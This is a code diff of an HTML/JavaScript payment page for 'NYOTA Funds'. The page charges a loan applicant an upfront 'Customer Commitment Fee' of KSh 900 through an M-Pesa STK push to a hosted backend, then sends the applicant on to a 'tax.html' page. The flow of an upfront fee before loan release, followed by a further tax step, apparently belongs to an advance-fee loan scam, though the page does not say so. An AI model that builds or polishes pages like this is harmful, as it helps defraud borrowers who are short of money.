@@ -1,544 +1,488 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#087F32">
-<title>NYOTA Funds - Commitment Fee</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NYOTA Funds - Commitment Fee</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:"Inter",sans-serif;}
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-body{
-min-height:100vh;
-display:flex;
-justify-content:center;
-align-items:center;
-padding:18px;
-background:
-radial-gradient(circle at top left,rgba(34,197,94,.18),transparent 35%),
-radial-gradient(circle at bottom right,rgba(37,99,235,.18),transparent 35%),
-linear-gradient(135deg,#f8fafc,#eef6ff);
-}
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #f4f7fb;
+      color: #1f2937;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
 
-.container{width:100%;max-width:420px;}
+    .container {
+      width: 100%;
+      max-width: 460px;
+      background: #ffffff;
+      border-radius: 18px;
+      overflow: hidden;
+      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.08);
+    }
 
-.card{
-background:#fff;
-border-radius:24px;
-overflow:hidden;
-box-shadow:0 20px 50px rgba(15,23,42,.14);
-}
+    .header {
+      background: linear-gradient(135deg, #087443, #0b9958);
+      color: white;
+      padding: 28px 24px;
+      text-align: center;
+    }
 
-.header{
-background:linear-gradient(145deg,#087F32,#2563EB);
-padding:26px 22px 46px;
-text-align:center;
-position:relative;
-color:white;
-}
+    .header h1 {
+      font-size: 25px;
+      font-weight: 800;
+      margin-bottom: 8px;
+    }
 
-.badge{
-position:absolute;
-left:50%;
-bottom:-26px;
-transform:translateX(-50%);
-width:52px;
-height:52px;
-border-radius:16px;
-background:white;
-display:flex;
-align-items:center;
-justify-content:center;
-box-shadow:0 10px 25px rgba(37,99,235,.25);
-}
+    .header p {
+      font-size: 14px;
+      opacity: 0.95;
+    }
 
-.badge svg{
-width:26px;
-height:26px;
-stroke:#087F32;
-}
+    .content {
+      padding: 26px 24px;
+    }
 
-.header h1{font-size:26px;font-weight:700;}
-.header p{margin-top:5px;font-size:14px;color:#E5F3FF;}
+    .fee-box {
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      border-radius: 14px;
+      padding: 22px 16px;
+      text-align: center;
+      margin-bottom: 22px;
+    }
 
-.content{padding:38px 22px 22px;}
+    .fee-box p {
+      color: #166534;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
 
-.notice{
-background:#F0FDF4;
-border:1px solid #BBF7D0;
-border-radius:16px;
-padding:15px;
-font-size:14px;
-line-height:1.6;
-color:#166534;
-margin-bottom:20px;
-}
+    .fee-amount {
+      color: #087443;
+      font-size: 34px;
+      font-weight: 800;
+    }
 
-.details{
-display:flex;
-flex-direction:column;
-gap:12px;
-margin-bottom:20px;
-}
+    .details {
+      background: #f9fafb;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 20px;
+    }
 
-.row{
-display:flex;
-justify-content:space-between;
-align-items:center;
-padding:12px 14px;
-background:#F8FAFC;
-border:1px solid #E5E7EB;
-border-radius:14px;
-}
+    .detail-row {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 12px;
+      font-size: 13px;
+    }
 
-.left{
-display:flex;
-align-items:center;
-gap:12px;
-font-size:14px;
-color:#475569;
-}
+    .detail-row:last-child {
+      margin-bottom: 0;
+    }
 
-.icon{
-width:36px;
-height:36px;
-border-radius:12px;
-background:linear-gradient(135deg,#DCFCE7,#DBEAFE);
-display:flex;
-align-items:center;
-justify-content:center;
-font-size:17px;
-}
+    .detail-label {
+      color: #6b7280;
+    }
 
-.value{
-font-size:14px;
-font-weight:600;
-color:#0F172A;
-}
+    .detail-value {
+      font-weight: 700;
+      color: #111827;
+      text-align: right;
+      overflow-wrap: anywhere;
+    }
 
-.payment-box{
-background:linear-gradient(145deg,#087F32,#2563EB);
-color:white;
-border-radius:18px;
-padding:18px;
-text-align:center;
-margin-bottom:20px;
-box-shadow:0 12px 28px rgba(37,99,235,.22);
-}
+    .notice {
+      background: #fff7ed;
+      border: 1px solid #fed7aa;
+      color: #9a3412;
+      border-radius: 10px;
+      padding: 14px;
+      font-size: 12px;
+      line-height: 1.6;
+      margin-bottom: 20px;
+    }
 
-.payment-box small{
-display:block;
-font-size:12px;
-opacity:.9;
-}
+    .phone-label {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
 
-.payment-box strong{
-display:block;
-margin-top:4px;
-font-size:26px;
-font-weight:700;
-}
+    .phone-input {
+      width: 100%;
+      padding: 14px;
+      border: 1px solid #d1d5db;
+      border-radius: 10px;
+      font-size: 15px;
+      outline: none;
+      margin-bottom: 16px;
+    }
 
-button{
-width:100%;
-padding:19px;
-border:none;
-border-radius:18px;
-background:linear-gradient(145deg,#16A34A,#087F32);
-color:white;
-font-size:18px;
-font-weight:700;
-cursor:pointer;
-position:relative;
-overflow:hidden;
-transition:.25s ease;
-box-shadow:0 14px 32px rgba(22,163,74,.35);
-}
+    .phone-input:focus {
+      border-color: #087443;
+      box-shadow: 0 0 0 3px rgba(8, 116, 67, 0.1);
+    }
 
-button::before{
-content:"";
-position:absolute;
-top:0;
-left:-120%;
-width:50%;
-height:100%;
-background:linear-gradient(120deg,transparent,rgba(255,255,255,.35),transparent);
-transform:skewX(-20deg);
-transition:left .6s ease;
-}
+    .pay-button {
+      width: 100%;
+      border: none;
+      border-radius: 10px;
+      padding: 15px;
+      background: #087443;
+      color: white;
+      font-size: 15px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
 
-button:hover{
-transform:translateY(-2px);
-box-shadow:0 18px 40px rgba(22,163,74,.45);
-}
+    .pay-button:hover {
+      background: #065f36;
+    }
 
-button:hover::before{left:140%;}
-button:active{transform:scale(.98);}
-button:disabled{opacity:.6;cursor:not-allowed;transform:none;box-shadow:none;}
+    .pay-button:disabled {
+      background: #9ca3af;
+      cursor: not-allowed;
+    }
 
-#status{
-margin-top:14px;
-font-size:13px;
-text-align:center;
-min-height:22px;
-padding:8px;
-border-radius:10px;
-}
+    .status {
+      display: none;
+      margin-top: 16px;
+      padding: 12px;
+      border-radius: 9px;
+      font-size: 13px;
+      line-height: 1.5;
+      text-align: center;
+      overflow-wrap: anywhere;
+    }
 
-.success{
-background:#ECFDF5;
-color:#15803D;
-}
+    .status.info {
+      display: block;
+      color: #1d4ed8;
+      background: #eff6ff;
+      border: 1px solid #bfdbfe;
+    }
 
-.error{
-background:#FEF2F2;
-color:#DC2626;
-}
+    .status.success {
+      display: block;
+      color: #166534;
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+    }
 
-.footer{
-display:flex;
-justify-content:space-between;
-margin-top:18px;
-padding-top:16px;
-border-top:1px solid #E5E7EB;
-font-size:11px;
-color:#64748B;
-flex-wrap:wrap;
-gap:8px;
-}
-</style>
+    .status.error {
+      display: block;
+      color: #991b1b;
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+    }
+
+    .footer {
+      text-align: center;
+      padding: 0 24px 24px;
+      color: #6b7280;
+      font-size: 11px;
+      line-height: 1.6;
+    }
+
+    .whatsapp-button {
+      display: block;
+      text-align: center;
+      text-decoration: none;
+      background: #25D366;
+      color: white;
+      padding: 12px;
+      border-radius: 10px;
+      margin-top: 14px;
+      font-weight: 700;
+      font-size: 13px;
+    }
+  </style>
 </head>
 
 <body>
-
-<div class="container">
-
-<div class="card">
-
-<div class="header">
-
-<h1>NYOTA Funds</h1>
-<p>Commitment Fee Payment</p>
-
-<div class="badge">
-<svg viewBox="0 0 24 24" fill="none" stroke-width="2">
-<path d="M12 3L19 6V11C19 16 15.5 19.8 12 21C8.5 19.8 5 16 5 11V6L12 3Z"/>
-</svg>
-</div>
-
-</div>
-
-<div class="content">
-
-<div class="notice">
-To complete your NYOTA Funds application, a **Customer Commitment Fee of KSh 900** is required. Once payment is confirmed, your application will proceed to the final processing stage
-</div>
-
-<div class="details">
-
-<div class="row">
-<div class="left"><div class="icon">👤</div><div>Applicant</div></div>
-<div class="value" id="fullName">Applicant</div>
-</div>
-
-<div class="row">
-<div class="left"><div class="icon">📞</div><div>Phone</div></div>
-<div class="value" id="phone">Not available</div>
-</div>
-
-<div class="row">
-<div class="left"><div class="icon">💰</div><div>Selected Amount</div></div>
-<div class="value">KSh <span id="fund">22,000</span></div>
-</div>
-
-</div>
-
-<div class="payment-box">
-<small>Customer Commitment Fee</small>
-<strong>KSh 900</strong>
-</div>
-
-<button id="payBtn">Pay Commitment Fee →</button>
-
-<div id="status"></div>
-
-<div class="footer">
-<span>🔒 SSL Secure</span>
-<span>M-PESA STK Push</span>
-<span>Protected</span>
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-<script>
-"use strict";
-
-/* PAYLOR LIVE BACKEND */
-const BACKEND_URL = "https://nyota-funds-26-27.onrender.com";
-const SERVICE_FEE=900;
-
-document.getElementById("fullName").textContent=
-localStorage.getItem("fullName")||
-localStorage.getItem("fullname")||
-"Applicant";
-
-document.getElementById("phone").textContent=
-localStorage.getItem("phoneNumber")||
-localStorage.getItem("phone")||
-"Not available";
-
-const amount=
-localStorage.getItem("loanAmount")||
-localStorage.getItem("requestedAmount")||
-localStorage.getItem("selectedAmount")||
-22000;
-
-document.getElementById("fund").textContent=
-Number(amount).toLocaleString("en-KE");
-
-const payBtn=document.getElementById("payBtn");
-const statusEl=document.getElementById("status");
-
-function setStatus(msg,type=""){
-statusEl.textContent=msg;
-statusEl.className=type;
-}
-
-function setLoading(state,text){
-payBtn.disabled=state;
-payBtn.textContent=state?text:"Pay Commitment Fee →";
-}
-
-function normalizePhone(phone){
-phone=phone.replace(/[^\d+]/g,"");
-if(phone.startsWith("+254")) phone=phone.slice(1);
-if(phone.startsWith("07")||phone.startsWith("01")){
-phone="254"+phone.slice(1);
-}
-return phone;
-}
-
-async function readJson(res){
-const txt=await res.text();
-return txt?JSON.parse(txt):{};
-}
-
-async function payService(){
-
-const savedPhone=
-localStorage.getItem("phoneNumber")||
-localStorage.getItem("phone");
-
-if(!savedPhone){
-setStatus("Phone number not found.","error");
-return;
-}
-
-const phone=normalizePhone(savedPhone);
-
-setLoading(true,"Sending STK Push...");
-setStatus("Sending payment request...");
-
-try{
-
-const response=await fetch(`${BACKEND_URL}/stk-push`,{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-phone,
-amount:SERVICE_FEE
-})
-});
-
-const data=await readJson(response);
-
-if(!response.ok||data.success===false){
-throw new Error(data.message||"Payment request failed.");
-}
-
-const transactionId=
-data.transactionId||
-data.data?.transactionId||
-data.checkout_request_id||
-data.data?.checkout_request_id;
-
-if(!transactionId){
-throw new Error("Transaction reference missing.");
-}
-
-setLoading(true,"Waiting for payment...");
-setStatus("STK Push sent. Enter your M-PESA PIN.");
-
-await checkPayment(transactionId);
-
-}catch(error){
-
-setStatus(error.message,"error");
-setLoading(false);
-
-}
-
-}
-
-async function checkPayment(transactionId){
-
-const start=Date.now();
-
-while(Date.now()-start<120000){
-
-try{
-
-const response=await fetch(`${BACKEND_URL}/payment-status`,{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({transactionId})
-});
-
-const result=await readJson(response);
-
-const status=String(result.data?.status||"").toUpperCase();
-
-if(["SUCCESS","COMPLETED","CONFIRMED"].includes(status)){
-
-setStatus("Payment confirmed. Redirecting...","success");
-setLoading(true,"Payment Confirmed");
-
-setTimeout(()=>{
-window.location.href="tax.html";
-},1000);
-
-return;
-}
-
-if(["FAILED","CANCELLED","EXPIRED"].includes(status)){
-throw new Error("Payment "+status.toLowerCase()+".");
-}
-
-}catch(error){
-
-if(/failed|cancelled|expired/i.test(error.message)){
-setStatus(error.message,"error");
-setLoading(false);
-return;
-}
-
-}
-
-await new Promise(r=>setTimeout(r,3000));
-
-}
-
-setStatus("Payment confirmation timed out.","error");
-setLoading(false);
-}
-
-payBtn.addEventListener("click",payService);
-</script>
-
-<!-- WhatsApp Floating Button -->
-<div class="whatsapp-widget">
-    <div class="whatsapp-tooltip">Chat with us</div>
-
-    <a
-        href="https://wa.me/254180615574?text=Hi%20NYOTA%20Funds%2C%20I%20need%20assistance."
+  <div class="container">
+    <div class="header">
+      <h1>NYOTA Funds</h1>
+      <p>Customer Commitment Fee</p>
+    </div>
+
+    <div class="content">
+      <div class="fee-box">
+        <p>Commitment Fee</p>
+        <div class="fee-amount">KSh 900</div>
+      </div>
+
+      <div class="details">
+        <div class="detail-row">
+          <span class="detail-label">Applicant Name</span>
+          <span class="detail-value" id="applicantName">Applicant</span>
+        </div>
+
+        <div class="detail-row">
+          <span class="detail-label">Phone Number</span>
+          <span class="detail-value" id="applicantPhone">Not provided</span>
+        </div>
+
+        <div class="detail-row">
+          <span class="detail-label">Selected Amount</span>
+          <span class="detail-value" id="loanAmount">Not provided</span>
+        </div>
+      </div>
+
+      <div class="notice">
+        <strong>Customer Commitment Fee of KSh 900</strong><br>
+        Please verify the fee and the official NYOTA Funds payment instructions before proceeding. Only approve a payment prompt if you have confirmed the recipient and amount.
+      </div>
+
+      <label class="phone-label" for="phone">M-Pesa Phone Number</label>
+      <input
+        type="tel"
+        id="phone"
+        class="phone-input"
+        placeholder="e.g. 0712345678"
+        autocomplete="tel"
+        inputmode="tel"
+      >
+
+      <button id="payButton" class="pay-button" onclick="startPayment()">
+        Pay KSh 900
+      </button>
+
+      <div id="status" class="status" role="status" aria-live="polite"></div>
+    </div>
+
+    <div class="footer">
+      Please ensure your phone number is correct before requesting the payment prompt.
+
+      <a
+        class="whatsapp-button"
+        href="https://wa.me/"
         target="_blank"
         rel="noopener noreferrer"
-        aria-label="Chat with us on WhatsApp"
-        class="whatsapp-button"
-    >
-        <svg viewBox="0 0 32 32" aria-hidden="true">
-            <path d="M16 3C8.82 3 3 8.82 3 16c0 2.29.6 4.44 1.75 6.33L3 29l6.86-1.7A12.94 12.94 0 0 0 16 29c7.18 0 13-5.82 13-13S23.18 3 16 3zm0 23.6c-2.02 0-3.99-.54-5.71-1.56l-.41-.24-4.07 1.01 1.05-3.97-.27-.43A10.56 10.56 0 1 1 16 26.6zm5.8-7.92c-.32-.16-1.9-.94-2.19-1.05-.29-.11-.5-.16-.71.16-.21.32-.81 1.05-.99 1.27-.18.21-.36.24-.68.08-.32-.16-1.35-.5-2.57-1.59-.95-.85-1.59-1.89-1.78-2.21-.18-.32-.02-.49.14-.65.14-.14.32-.36.48-.54.16-.18.21-.32.32-.53.11-.21.05-.4-.03-.56-.08-.16-.71-1.71-.97-2.34-.26-.62-.52-.54-.71-.55h-.61c-.21 0-.55.08-.84.4-.29.32-1.1 1.08-1.1 2.63s1.13 3.05 1.29 3.26c.16.21 2.22 3.39 5.38 4.76.75.32 1.34.51 1.8.65.61-.09 1.9-.78 2.17-1.53.27-.75.27-1.4.19-1.53-.08-.13-.29-.21-.61-.37z"/>
-        </svg>
-    </a>
-</div>
+      >
+        Contact Support on WhatsApp
+      </a>
+    </div>
+  </div>
 
-<style>
-.whatsapp-widget{
-    position:fixed;
-    right:20px;
-    bottom:20px;
-    z-index:99999;
-}
+  <script>
+    const BACKEND_URL = "https://nyota-funds-26-27.onrender.com";
+    const SERVICE_FEE = 900;
 
-.whatsapp-button{
-    width:62px;
-    height:62px;
-    border-radius:50%;
-    background:#25D366;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    text-decoration:none;
-    box-shadow:0 6px 20px rgba(0,0,0,.30);
-    transition:transform .25s ease;
-    animation:whatsappPulse 2.5s infinite;
-}
+    const savedName =
+      localStorage.getItem("fullName") ||
+      localStorage.getItem("fullname") ||
+      "Applicant";
 
-.whatsapp-button svg{
-    width:35px;
-    height:35px;
-    fill:white;
-}
+    const savedPhone =
+      localStorage.getItem("phoneNumber") ||
+      localStorage.getItem("phone") ||
+      "";
 
-.whatsapp-button:hover{
-    transform:scale(1.1);
-}
+    const savedLoanAmount =
+      localStorage.getItem("loanAmount") ||
+      localStorage.getItem("selectedAmount") ||
+      localStorage.getItem("amount") ||
+      "";
 
-.whatsapp-tooltip{
-    position:absolute;
-    right:75px;
-    top:50%;
-    transform:translateY(-50%);
-    background:#111827;
-    color:white;
-    padding:10px 15px;
-    border-radius:9px;
-    font-size:14px;
-    font-weight:600;
-    white-space:nowrap;
-    opacity:0;
-    visibility:hidden;
-    transition:.25s ease;
-}
+    document.getElementById("applicantName").textContent = savedName;
+    document.getElementById("applicantPhone").textContent =
+      savedPhone || "Not provided";
 
-.whatsapp-widget:hover .whatsapp-tooltip{
-    opacity:1;
-    visibility:visible;
-}
+    document.getElementById("loanAmount").textContent =
+      savedLoanAmount
+        ? "KSh " + Number(savedLoanAmount).toLocaleString("en-KE")
+        : "Not provided";
 
-@keyframes whatsappPulse{
-    0%{box-shadow:0 0 0 0 rgba(37,211,102,.5);}
-    70%{box-shadow:0 0 0 13px rgba(37,211,102,0);}
-    100%{box-shadow:0 0 0 0 rgba(37,211,102,0);}
-}
+    document.getElementById("phone").value = savedPhone;
 
-@media(max-width:600px){
-    .whatsapp-widget{
-        right:15px;
-        bottom:15px;
+    function normalizePhone(phone) {
+      let value = String(phone || "").replace(/[\s-]/g, "");
+
+      if (value.startsWith("+254")) {
+        value = value.substring(1);
+      } else if (value.startsWith("0")) {
+        value = "254" + value.substring(1);
+      }
+
+      return value;
     }
 
-    .whatsapp-button{
-        width:58px;
-        height:58px;
+    function setStatus(message, type) {
+      const statusElement = document.getElementById("status");
+      statusElement.textContent = message;
+      statusElement.className = "status " + type;
     }
 
-    .whatsapp-tooltip{
-        display:none;
+    function setLoading(loading, buttonText) {
+      const button = document.getElementById("payButton");
+      button.disabled = loading;
+      button.textContent = buttonText;
     }
-}
-</style>
 
+    async function readJson(response) {
+      const text = await response.text();
+
+      try {
+        return text ? JSON.parse(text) : {};
+      } catch {
+        throw new Error(
+          "The server returned an invalid response. Please try again later."
+        );
+      }
+    }
+
+    async function checkPayment(transactionId) {
+      const maxAttempts = 20;
+      const delayMs = 5000;
+
+      for (let attempt = 0; attempt < maxAttempts; attempt++) {
+        await new Promise(resolve => setTimeout(resolve, delayMs));
+
+        let response;
+        let result;
+
+        try {
+          response = await fetch(BACKEND_URL + "/payment-status", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ transactionId })
+          });
+
+          result = await readJson(response);
+        } catch (error) {
+          if (attempt === maxAttempts - 1) {
+            throw error;
+          }
+
+          continue;
+        }
+
+        if (!response.ok || result.success === false) {
+          throw new Error(
+            result.message || "Could not check payment status."
+          );
+        }
+
+        const status = String(result.status || "").toUpperCase();
+
+        if (result.verified === true && status === "COMPLETED") {
+          setStatus(
+            "Payment confirmed. Redirecting...",
+            "success"
+          );
+
+          setLoading(true, "Payment Confirmed");
+
+          setTimeout(() => {
+  window.location.href = "tax.html";
+}, 1000);
+
+          return;
+        }
+
+        if (["FAILED", "CANCELLED", "EXPIRED"].includes(status)) {
+          throw new Error(
+            "The payment was " + status.toLowerCase() +
+            ". Please try again if you still wish to proceed."
+          );
+        }
+
+        setStatus(
+          "Waiting for payment confirmation... (" +
+          (attempt + 1) + "/" + maxAttempts + ")",
+          "info"
+        );
+      }
+
+      throw new Error(
+        "Payment has not been confirmed yet. Please check your M-Pesa messages before trying again."
+      );
+    }
+
+    async function startPayment() {
+      const phone = normalizePhone(
+        document.getElementById("phone").value
+      );
+
+      if (!/^254[17]\d{8}$/.test(phone)) {
+        setStatus(
+          "Please enter a valid Kenyan phone number, such as 0712345678.",
+          "error"
+        );
+        return;
+      }
+
+      setLoading(true, "Requesting Payment...");
+      setStatus(
+        "Requesting the M-Pesa payment prompt. Please wait...",
+        "info"
+      );
+
+      try {
+        const response = await fetch(BACKEND_URL + "/stk-push", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            phone,
+            amount: SERVICE_FEE
+          })
+        });
+
+        const result = await readJson(response);
+
+        if (!response.ok || result.success !== true) {
+          throw new Error(
+            result.message || "Could not start the payment."
+          );
+        }
+
+        if (!result.transactionId) {
+          throw new Error(
+            "The payment service did not return a transaction ID."
+          );
+        }
+
+        localStorage.setItem("phoneNumber", phone);
+
+        setStatus(
+          "Payment prompt requested. If it arrives, enter your M-Pesa PIN to authorize the payment. Waiting for confirmation...",
+          "info"
+        );
+
+        await checkPayment(result.transactionId);
+      } catch (error) {
+        setStatus(
+          error.message || "Something went wrong. Please try again.",
+          "error"
+        );
+      } finally {
+        setLoading(false, "Pay KSh 900");
+      }
+    }
+  </script>
 </body>
 </html>
